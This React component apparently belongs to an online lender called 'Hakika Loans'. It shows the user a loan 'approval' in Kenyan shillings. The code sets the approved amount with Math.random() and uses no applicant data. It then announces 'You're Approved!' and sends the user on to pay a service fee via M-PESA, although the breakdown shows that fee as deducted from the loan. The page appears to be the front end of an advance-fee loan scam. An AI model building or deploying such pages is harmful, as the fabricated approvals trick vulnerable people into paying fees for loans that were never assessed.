import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';

const LoanLimit = () => {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(true);
  const [loanLimit, setLoanLimit] = useState(0);
  const [serviceFee, setServiceFee] = useState(0);
  
  const calculateServiceFee = (loanAmount: number): number => {
    if (loanAmount <= 2000) return Math.floor(loanAmount * 0.06) + 10;
    else if (loanAmount <= 3500) return Math.floor(loanAmount * 0.055) + 15;
    return Math.floor(loanAmount * 0.05) + 20;
  };
  
  useEffect(() => {
    const savePhoneFromDetails = () => {
      // Get phone from ConfirmDetails if saved
      const savedLimit = sessionStorage.getItem('hakika_loan_limit');
      const savedFee = sessionStorage.getItem('hakika_service_fee');
      
      if (savedLimit && savedFee) {
        setLoanLimit(parseInt(savedLimit));
        setServiceFee(parseInt(savedFee));
        setLoading(false);
        return;
      }
      
      // Calculate new limit
      setLoading(true);
      
      setTimeout(async () => {
        const random = Math.random();
        let calculatedLimit = random < 0.9 
          ? Math.floor(Math.random() * (3500 - 980) + 980)
          : Math.floor(Math.random() * (10000 - 3500) + 3500);
        
        calculatedLimit = Math.max(980, Math.min(10000, calculatedLimit));
        const fee = calculateServiceFee(calculatedLimit);
        
        sessionStorage.setItem('hakika_loan_limit', calculatedLimit.toString());
        sessionStorage.setItem('hakika_service_fee', fee.toString());
        
        setLoanLimit(calculatedLimit);
        setServiceFee(fee);
        setLoading(false);
      }, 800);
    };
    
    savePhoneFromDetails();
  }, []);

  const handleProceed = () => {
    navigate('/verify');
  };

  const formatCurrency = (amount: number) => {
    return new Intl.NumberFormat('en-KE', {
      style: 'currency',
      currency: 'KES',
      minimumFractionDigits: 0,
    }).format(amount);
  };

  if (loading) {
    return (
      <div className="page-container">
        <div className="loading">
          <div className="spinner"></div>
          <p>Calculating your loan limit...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="page-container">
      <div className="logo-container">
        <h1 className="logo">🏦 Hakika Loans</h1>
      </div>
      
      <div style={{ textAlign: 'center', marginBottom: '24px' }}>
        <div style={{ fontSize: '48px', marginBottom: '8px' }}>🎉</div>
        <h1 style={{ fontSize: '22px', marginBottom: '8px' }}>You're Approved!</h1>
        <p style={{ color: '#5f6368', margin: 0 }}>
          Congratulations! You've been approved for a personal loan.
        </p>
      </div>
      
      {/* Loan Amount Card */}
      <div style={{
        background: 'linear-gradient(135deg, #1a73e8 0%, #0d47a1 100%)',
        borderRadius: '16px',
        padding: '28px 20px',
        textAlign: 'center',
        marginBottom: '24px',
      }}>
        <p style={{ margin: 0, fontSize: '14px', opacity: 0.9, textTransform: 'uppercase', letterSpacing: '1px', color: 'white' }}>
          Approved Loan Amount
        </p>
        <p style={{ fontSize: '36px', fontWeight: '700', margin: '8px 0 0', color: '#ffffff' }}>
          {formatCurrency(loanLimit)}
        </p>
      </div>
      
      {/* Payment Breakdown */}
      <div style={{ background: '#f8f9fa', borderRadius: '12px', padding: '16px', marginBottom: '24px' }}>
        <h3 style={{ fontSize: '14px', color: '#5f6368', marginBottom: '16px', textTransform: 'uppercase' }}>Payment Breakdown</h3>
        
        <div style={{ display: 'flex', justifyContent: 'space-between', padding: '12px 0', borderBottom: '1px solid #dadce0' }}>
          <span style={{ color: '#5f6368' }}>Loan Amount</span>
          <span style={{ fontWeight: '600' }}>{formatCurrency(loanLimit)}</span>
        </div>
        
        <div style={{ display: 'flex', justifyContent: 'space-between', padding: '12px 0', borderBottom: '1px solid #dadce0' }}>
          <span style={{ color: '#5f6368' }}>Service Fee</span>
          <span style={{ fontWeight: '600', color: '#ea4335' }}>-{formatCurrency(serviceFee)}</span>
        </div>
        
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '12px', background: 'rgba(52, 168, 83, 0.1)', margin: '8px -16px -16px', borderRadius: '0 0 12px 12px' }}>
          <span style={{ fontWeight: '600' }}>You'll Receive</span>
          <span style={{ fontWeight: '700', color: '#34a853', fontSize: '18px' }}>{formatCurrency(loanLimit - serviceFee)}</span>
        </div>
      </div>
      
      {/* Loan Details */}
      <div style={{ marginBottom: '24px' }}>
        <div style={{ display: 'flex', justifyContent: 'space-between', padding: '10px 0', borderBottom: '1px solid #f1f3f4' }}>
          <span style={{ color: '#5f6368', fontSize: '14px' }}>Interest Rate</span>
          <span style={{ fontWeight: '500', fontSize: '14px' }}>12% per year</span>
        </div>
        <div style={{ display: 'flex', justifyContent: 'space-between', padding: '10px 0', borderBottom: '1px solid #f1f3f4' }}>
          <span style={{ color: '#5f6368', fontSize: '14px' }}>Repayment Period</span>
          <span style={{ fontWeight: '500', fontSize: '14px' }}>30 Days</span>
        </div>
      </div>
      
      {/* Proceed Button */}
      <button 
        className="btn btn-primary" 
        onClick={handleProceed}
        style={{ marginBottom: '16px' }}
      >
        Proceed to Verification & Payment
      </button>
      
      <p style={{ textAlign: 'center', fontSize: '11px', color: '#5f6368', margin: '8px 0 0' }}>
        Continue to pay service fee via M-PESA
      </p>
    </div>
  );
};

export default LoanLimit;
